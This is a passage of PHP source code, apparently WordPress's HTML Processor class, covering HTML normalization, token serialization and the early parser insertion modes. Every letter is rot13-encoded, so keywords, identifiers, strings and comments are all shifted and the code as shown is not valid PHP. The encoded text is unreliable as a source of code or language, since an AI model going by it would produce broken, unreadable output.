	 *  - Nal vapbzcyrgr flagnk genvyvat ng gur raq jvyy or bzvggrq,
	 *    sbe rknzcyr, na hapybfrq pbzzrag bcrare jvyy or erzbirq.
	 *
	 * Rknzcyr:
	 *
	 *     rpub JC_UGZY_Cebprffbe::abeznyvmr( '<n uers=#napube i=5 uers=\"/\" ranoyrq>Bar</n nabgure i=5><!--' );
	 *     // <n uers=\"#napube\" i=\"5\" ranoyrq>Bar</n>
	 *
	 *     rpub JC_UGZY_Cebprffbe::abeznyvmr( '<qvi></c>sha<gnoyr><gq>pryy</qvi>' );
	 *     // <qvi><c></c>sha<gnoyr><gobql><ge><gq>pryy</gq></ge></gobql></gnoyr></qvi>
	 *
	 *     rpub JC_UGZY_Cebprffbe::abeznyvmr( '<![PQNGN[vainyvq pbzzrag]]> flagnk < <> \"bqqvgvrf\"' );
	 *     // <!--[PQNGN[vainyvq pbzzrag]]--> flagnk &yg; &yg;&tg; &dhbg;bqqvgvrf&dhbg;
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $ugzy Vachg UGZY gb abeznyvmr.
	 *
	 * @erghea fgevat|ahyy Abeznyvmrq bhgchg, be `ahyy` vs hanoyr gb abeznyvmr.
	 */
	choyvp fgngvp shapgvba abeznyvmr( fgevat $ugzy ): ?fgevat {
		erghea fgngvp::perngr_sentzrag( $ugzy )->frevnyvmr();
	}

	/**
	 * Ergheaf abeznyvmrq UGZY sbe n sentzrag ol frevnyvmvat vg.
	 *
	 * Guvf qvssref sebz {@frr JC_UGZY_Cebprffbe::abeznyvmr} va gung vg fgnegf jvgu
	 * n fcrpvsvp UGZY Cebprffbe, juvpu _zhfg_ abg unir nyernql fgnegrq fpnaavat;
	 * vg zhfg or va gur vavgvny ernql fgngr naq jvyy or va gur pbzcyrgrq fgngr bapr
	 * frevnyvmngvba vf pbzcyrgr.
	 *
	 * Znal nfcrpgf bs na vachg UGZY sentzrag znl or punatrq qhevat abeznyvmngvba.
	 *
	 *  - Nggevohgr inyhrf jvyy or qbhoyr-dhbgrq.
	 *  - Qhcyvpngr nggevohgrf jvyy or erzbirq.
	 *  - Bzvggrq gntf jvyy or nqqrq.
	 *  - Gnt naq nggevohgr anzr pnfvat jvyy or ybjre-pnfrq,
	 *    rkprcg sbe fcrpvsvp FIT naq ZnguZY gntf be nggevohgrf.
	 *  - Grkg jvyy or er-rapbqrq, ahyy olgrf unaqyrq,
	 *    naq vainyvq HGS-8 ercynprq jvgu H+SSSQ.
	 *  - Nal vapbzcyrgr flagnk genvyvat ng gur raq jvyy or bzvggrq,
	 *    sbe rknzcyr, na hapybfrq pbzzrag bcrare jvyy or erzbirq.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<n uers=#napube i=5 uers=\"/\" ranoyrq>Bar</n nabgure i=5><!--' );
	 *     rpub $cebprffbe->frevnyvmr();
	 *     // <n uers=\"#napube\" i=\"5\" ranoyrq>Bar</n>
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<qvi></c>sha<gnoyr><gq>pryy</qvi>' );
	 *     rpub $cebprffbe->frevnyvmr();
	 *     // <qvi><c></c>sha<gnoyr><gobql><ge><gq>pryy</gq></ge></gobql></gnoyr></qvi>
	 *
	 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<![PQNGN[vainyvq pbzzrag]]> flagnk < <> \"bqqvgvrf\"' );
	 *     rpub $cebprffbe->frevnyvmr();
	 *     // <!--[PQNGN[vainyvq pbzzrag]]--> flagnk &yg; &yg;&tg; &dhbg;bqqvgvrf&dhbg;
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea fgevat|ahyy Abeznyvmrq UGZY znexhc ercerfragrq ol cebprffbe,
	 *                     be `ahyy` vs hanoyr gb trarengr frevnyvmngvba.
	 */
	choyvp shapgvba frevnyvmr(): ?fgevat {
		vs ( JC_UGZY_Gnt_Cebprffbe::FGNGR_ERNQL !== $guvf->cnefre_fgngr ) {
			jc_gevttre_reebe(
				__ZRGUBQ__,
				'Na UGZY Cebprffbe juvpu unf nyernql fgnegrq cebprffvat pnaabg frevnyvmr vgf pbagragf. Frevnyvmr vzzrqvngryl nsgre perngvat gur vafgnapr.',
				R_HFRE_JNEAVAT
			);
			erghea ahyy;
		}

		$ugzy = '';
		juvyr ( $guvf->arkg_gbxra() ) {
			$ugzy .= $guvf->frevnyvmr_gbxra();
		}

		vs ( ahyy !== $guvf->trg_ynfg_reebe() ) {
			jc_gevttre_reebe(
				__ZRGUBQ__,
				\"Pnaabg frevnyvmr UGZY Cebprffbe jvgu cnefvat reebe: {$guvf->trg_ynfg_reebe()}.\",
				R_HFRE_JNEAVAT
			);
			erghea ahyy;
		}

		erghea $ugzy;
	}

	/**
	 * Frevnyvmrf gur pheeragyl-zngpurq gbxra.
	 *
	 * Guvf zrgubq cebqhprf n shyyl-abezngvir UGZY fgevat sbe gur pheeragyl-zngpurq gbxra,
	 * vs noyr. Vs abg zngpurq ng nal gbxra be vs gur gbxra qbrfa'g pbeerfcbaq gb nal UGZY
	 * vg jvyy erghea na rzcgl fgevat (sbe rknzcyr, cerfhzcghbhf raq gntf ner vtaberq).
	 *
	 * @frr fgngvp::frevnyvmr()
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea fgevat Frevnyvmngvba bs gbxra, be rzcgl fgevat vs ab frevnyvmngvba rkvfgf.
	 */
	cebgrpgrq shapgvba frevnyvmr_gbxra(): fgevat {
		$ugzy       = '';
		$gbxra_glcr = $guvf->trg_gbxra_glcr();

		fjvgpu ( $gbxra_glcr ) {
			pnfr '#qbpglcr':
				$qbpglcr = $guvf->trg_qbpglcr_vasb();
				vs ( ahyy === $qbpglcr ) {
					oernx;
				}

				$ugzy .= '<!QBPGLCR';

				vs ( $qbpglcr->anzr ) {
					$ugzy .= \" {$qbpglcr->anzr}\";
				}

				vs ( ahyy !== $qbpglcr->choyvp_vqragvsvre ) {
					$dhbgr = fge_pbagnvaf( $qbpglcr->choyvp_vqragvsvre, '\"' ) ? \"'\" : '\"';
					$ugzy .= \" CHOYVP {$dhbgr}{$qbpglcr->choyvp_vqragvsvre}{$dhbgr}\";
				}
				vs ( ahyy !== $qbpglcr->flfgrz_vqragvsvre ) {
					vs ( ahyy === $qbpglcr->choyvp_vqragvsvre ) {
						$ugzy .= ' FLFGRZ';
					}
					$dhbgr = fge_pbagnvaf( $qbpglcr->flfgrz_vqragvsvre, '\"' ) ? \"'\" : '\"';
					$ugzy .= \" {$dhbgr}{$qbpglcr->flfgrz_vqragvsvre}{$dhbgr}\";
				}

				$ugzy .= '>';
				oernx;

			pnfr '#grkg':
				$ugzy .= ugzyfcrpvnypunef( $guvf->trg_zbqvsvnoyr_grkg(), RAG_DHBGRF | RAG_FHOFGVGHGR | RAG_UGZY5, 'HGS-8' );
				oernx;

			// Hayvxr gur `<>` juvpu vf vagrecergrq nf cynvagrkg, guvf vf vtaberq ragveryl.
			pnfr '#cerfhzcghbhf-gnt':
				oernx;

			pnfr '#shaxl-pbzzrag':
			pnfr '#pbzzrag':
				$ugzy .= \"<!--{$guvf->trg_shyy_pbzzrag_grkg()}-->\";
				oernx;

			pnfr '#pqngn-frpgvba':
				$ugzy .= \"<![PQNGN[{$guvf->trg_zbqvsvnoyr_grkg()}]]>\";
				oernx;
		}

		vs ( '#gnt' !== $gbxra_glcr ) {
			erghea $ugzy;
		}

		$gnt_anzr       = fge_ercynpr( \"\k00\", \"\h{SSSQ}\", $guvf->trg_gnt() );
		$va_ugzy        = 'ugzy' === $guvf->trg_anzrfcnpr();
		$dhnyvsvrq_anzr = $va_ugzy ? fgegbybjre( $gnt_anzr ) : $guvf->trg_dhnyvsvrq_gnt_anzr();

		vs ( $guvf->vf_gnt_pybfre() ) {
			$ugzy .= \"</{$dhnyvsvrq_anzr}>\";
			erghea $ugzy;
		}

		$nggevohgr_anzrf = $guvf->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
		vs ( ! vffrg( $nggevohgr_anzrf ) ) {
			$ugzy .= \"<{$dhnyvsvrq_anzr}>\";
			erghea $ugzy;
		}

		$ugzy .= \"<{$dhnyvsvrq_anzr}\";
		sbernpu ( $nggevohgr_anzrf nf $nggevohgr_anzr ) {
			$ugzy .= \" {$guvf->trg_dhnyvsvrq_nggevohgr_anzr( $nggevohgr_anzr )}\";
			$inyhr = $guvf->trg_nggevohgr( $nggevohgr_anzr );

			vs ( vf_fgevat( $inyhr ) ) {
				$ugzy .= '=\"' . ugzyfcrpvnypunef( $inyhr, RAG_DHBGRF | RAG_FHOFGVGHGR | RAG_UGZY5 ) . '\"';
			}

			$ugzy = fge_ercynpr( \"\k00\", \"\h{SSSQ}\", $ugzy );
		}

		vs ( ! $va_ugzy && $guvf->unf_frys_pybfvat_synt() ) {
			$ugzy .= ' /';
		}

		$ugzy .= '>';

		// Syhfu bhg frys-pbagnvarq ryrzragf.
		vs ( $va_ugzy && va_neenl( $gnt_anzr, neenl( 'VSENZR', 'ABRZORQ', 'ABSENZRF', 'FPEVCG', 'FGLYR', 'GRKGNERN', 'GVGYR', 'KZC' ), gehr ) ) {
			$grkg = $guvf->trg_zbqvsvnoyr_grkg();

			fjvgpu ( $gnt_anzr ) {
				pnfr 'VSENZR':
				pnfr 'ABRZORQ':
				pnfr 'ABSENZRF':
					$grkg = '';
					oernx;

				pnfr 'FPEVCG':
				pnfr 'FGLYR':
					oernx;

				qrsnhyg:
					$grkg = ugzyfcrpvnypunef( $grkg, RAG_DHBGRF | RAG_FHOFGVGHGR | RAG_UGZY5, 'HGS-8' );
			}

			$ugzy .= \"{$grkg}</{$dhnyvsvrq_anzr}>\";
		}

		erghea $ugzy;
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'vavgvny' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'vavgvny' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-vavgvny-vafregvba-zbqr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_vavgvny(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( cnerag::vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA,
			 * > H+000N YVAR SRRQ (YS), H+000P SBEZ SRRQ (SS),
			 * > H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 *
			 * Cnefr reebe: vtaber gur gbxra.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc();
				}
				tbgb vavgvny_nalguvat_ryfr;
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				$qbpglcr = $guvf->trg_qbpglcr_vasb();
				vs ( ahyy !== $qbpglcr && 'dhvexf' === $qbpglcr->vaqvpngrq_pbzcngnovyvgl_zbqr ) {
					$guvf->pbzcng_zbqr = JC_UGZY_Gnt_Cebprffbe::DHVEXF_ZBQR;
				}

				/*
				 * > Gura, fjvgpu gur vafregvba zbqr gb \"orsber ugzy\".
				 */
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_UGZY;
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;
		}

		/*
		 * > Nalguvat ryfr
		 */
		vavgvny_nalguvat_ryfr:
		$guvf->pbzcng_zbqr           = JC_UGZY_Gnt_Cebprffbe::DHVEXF_ZBQR;
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_UGZY;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'orsber ugzy' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'orsber ugzy' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-orsber-ugzy-vafregvba-zbqr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_orsber_ugzy(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$vf_pybfre  = cnerag::vf_gnt_pybfre();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $vf_pybfre ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA,
			 * > H+000N YVAR SRRQ (YS), H+000P SBEZ SRRQ (SS),
			 * > H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 *
			 * Cnefr reebe: vtaber gur gbxra.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc();
				}
				tbgb orsber_ugzy_nalguvat_ryfr;
				oernx;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_URNQ;
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"urnq\", \"obql\", \"ugzy\", \"oe\"
			 *
			 * Pybfvat OE gntf ner nyjnlf ercbegrq ol gur Gnt Cebprffbe nf bcravat gntf.
			 */
			pnfr '-URNQ':
			pnfr '-OBQL':
			pnfr '-UGZY':
				/*
				 * > Npg nf qrfpevorq va gur \"nalguvat ryfr\" ragel orybj.
				 */
				tbgb orsber_ugzy_nalguvat_ryfr;
				oernx;
		}

		/*
		 * > Nal bgure raq gnt
		 */
		vs ( $vf_pybfre ) {
			// Cnefr reebe: vtaber gur gbxra.
			erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr.
		 *
		 * > Perngr na ugzy ryrzrag jubfr abqr qbphzrag vf gur Qbphzrag bowrpg.
		 * > Nccraq vg gb gur Qbphzrag bowrpg. Chg guvf ryrzrag va gur fgnpx bs bcra ryrzragf.
		 * > Fjvgpu gur vafregvba zbqr gb \"orsber urnq\", gura ercebprff gur gbxra.
		 */
		orsber_ugzy_nalguvat_ryfr:
		$guvf->vafreg_iveghny_abqr( 'UGZY' );
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_URNQ;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'orsber urnq' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'orsber urnq' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-orsber-urnq-vafregvba-zbqr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_orsber_urnq(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$vf_pybfre  = cnerag::vf_gnt_pybfre();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $vf_pybfre ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA,
			 * > H+000N YVAR SRRQ (YS), H+000P SBEZ SRRQ (SS),
			 * > H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 *
			 * Cnefr reebe: vtaber gur gbxra.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc();
				}
				tbgb orsber_urnq_nalguvat_ryfr;
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"urnq\"
			 */
			pnfr '+URNQ':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->urnq_ryrzrag   = $guvf->fgngr->pheerag_gbxra;
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ;
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"urnq\", \"obql\", \"ugzy\", \"oe\"
			 * > Npg nf qrfpevorq va gur \"nalguvat ryfr\" ragel orybj.
			 *
			 * Pybfvat OE gntf ner nyjnlf ercbegrq ol gur Gnt Cebprffbe nf bcravat gntf.
			 */
			pnfr '-URNQ':
			pnfr '-OBQL':
			pnfr '-UGZY':
				tbgb orsber_urnq_nalguvat_ryfr;
				oernx;
		}

		vs ( $vf_pybfre ) {
			// Cnefr reebe: vtaber gur gbxra.
			erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr
		 *
		 * > Vafreg na UGZY ryrzrag sbe n \"urnq\" fgneg gnt gbxra jvgu ab nggevohgrf.
		 */
		orsber_urnq_nalguvat_ryfr:
		$guvf->fgngr->urnq_ryrzrag   = $guvf->vafreg_iveghny_abqr( 'URNQ' );
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va urnq' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va urnq' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#cnefvat-znva-vaurnq
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_urnq(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$vf_pybfre  = cnerag::vf_gnt_pybfre();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $vf_pybfre ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			pnfr '#grkg':
				/*
				 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA,
				 * > H+000N YVAR SRRQ (YS), H+000P SBEZ SRRQ (SS),
				 * > H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
				 */
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					// Vafreg gur punenpgre.
					$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
					erghea gehr;
				}

				tbgb va_urnq_nalguvat_ryfr;
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"onfr\", \"onfrsbag\", \"otfbhaq\", \"yvax\"
			 */
			pnfr '+ONFR':
			pnfr '+ONFRSBAG':
			pnfr '+OTFBHAQ':
			pnfr '+YVAX':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"zrgn\"
			 */
			pnfr '+ZRGN':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );

				/*
				 * > Vs gur npgvir fcrphyngvir UGZY cnefre vf ahyy, gura:
				 * >   - Vs gur ryrzrag unf n punefrg nggevohgr, naq trggvat na rapbqvat sebz
				 * >     vgf inyhr erfhygf va na rapbqvat, naq gur pbasvqrapr vf pheeragyl
				 * >     gragngvir, gura punatr gur rapbqvat gb gur erfhygvat rapbqvat.
				 */
				$punefrg = $guvf->trg_nggevohgr( 'punefrg' );
				vs ( vf_fgevat( $punefrg ) && 'gragngvir' === $guvf->fgngr->rapbqvat_pbasvqrapr ) {
					$guvf->onvy( 'Pnaabg lrg cebprff ZRGN gntf jvgu punefrg gb qrgrezvar rapbqvat.' );
				}

				/*
				 * >   - Bgurejvfr, vs gur ryrzrag unf na uggc-rdhvi nggevohgr jubfr inyhr vf
				 * >     na NFPVV pnfr-vafrafvgvir zngpu sbe gur fgevat \"Pbagrag-Glcr\", naq
				 * >     gur ryrzrag unf n pbagrag nggevohgr, naq nccylvat gur nytbevguz sbe
				 * >     rkgenpgvat n punenpgre rapbqvat sebz n zrgn ryrzrag gb gung nggevohgr'f
				 * >     inyhr ergheaf na rapbqvat, naq gur pbasvqrapr vf pheeragyl gragngvir,
				 * >     gura punatr gur rapbqvat gb gur rkgenpgrq rapbqvat.
				 */
				$uggc_rdhvi = $guvf->trg_nggevohgr( 'uggc-rdhvi' );
				$pbagrag    = $guvf->trg_nggevohgr( 'pbagrag' );
				vs (
					vf_fgevat( $uggc_rdhvi ) &&
					vf_fgevat( $pbagrag ) &&
					0 === fgepnfrpzc( $uggc_rdhvi, 'Pbagrag-Glcr' ) &&
					'gragngvir' === $guvf->fgngr->rapbqvat_pbasvqrapr
				) {
					$guvf->onvy( 'Pnaabg lrg cebprff ZRGN gntf jvgu uggc-rdhvi Pbagrag-Glcr gb qrgrezvar rapbqvat.' );
				}

				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"gvgyr\"
			 */
			pnfr '+GVGYR':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"abfpevcg\", vs gur fpevcgvat synt vf ranoyrq
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"absenzrf\", \"fglyr\"
			 *
			 * Gur fpevcgvat synt vf arire ranoyrq va guvf cnefre.
			 */
			pnfr '+ABSENZRF':
			pnfr '+FGLYR':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"abfpevcg\", vs gur fpevcgvat synt vf qvfnoyrq
			 */
			pnfr '+ABFPEVCG':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ_ABFPEVCG;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"fpevcg\"
			 *
			 * @gbqb Pbhyq gur nqwhfgrq vafregvba ybpngvba or nalguvat bgure guna gur pheerag ybpngvba?
			 */
			pnfr '+FPEVCG':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"urnq\"
			 */
			pnfr '-URNQ':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_URNQ;
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"ugzy\", \"oe\"
			 *
			 * OE gntf ner nyjnlf ercbegrq ol gur Gnt Cebprffbe nf bcravat gntf.
			 */
			pnfr '-OBQL':
			pnfr '-UGZY':
				/*
				 * > Npg nf qrfpevorq va gur \"nalguvat ryfr\" ragel orybj.
				 */
				tbgb va_urnq_nalguvat_ryfr;
				oernx;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"grzcyngr\"
			 *
			 * @gbqb Pbhyq gur nqwhfgrq vafregvba ybpngvba or nalguvat bgure guna gur pheerag ybpngvba?
			 */
			pnfr '+GRZCYNGR':
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->vafreg_znexre();
				$guvf->fgngr->senzrfrg_bx = snyfr;

				$guvf->fgngr->vafregvba_zbqr                      = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GRZCYNGR;
				$guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GRZCYNGR;

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '-GRZCYNGR':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf( 'GRZCYNGR' ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf_gubebhtuyl();
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'GRZCYNGR' ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'GRZCYNGR' );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pyrne_hc_gb_ynfg_znexre();
				neenl_cbc( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
				$guvf->erfrg_vafregvba_zbqr_nccebcevngryl();
				erghea gehr;
		}

		/*
		 * > N fgneg gnt jubfr gnt anzr vf \"urnq\"
		 * > Nal bgure raq gnt
		 */
		vs ( '+URNQ' === $bc || $vf_pybfre ) {
			// Cnefr reebe: vtaber gur gbxra.
			erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr
		 */
		va_urnq_nalguvat_ryfr:
		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_URNQ;
